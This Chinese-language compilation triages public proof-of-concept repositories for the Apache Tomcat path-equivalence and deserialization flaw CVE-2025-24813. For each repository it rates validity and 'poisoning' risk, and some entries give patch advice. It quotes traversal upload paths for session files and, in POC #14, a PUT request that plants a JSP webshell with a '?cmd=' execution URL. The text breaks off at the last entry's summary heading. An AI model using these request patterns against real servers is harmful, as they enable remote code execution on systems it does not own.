1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
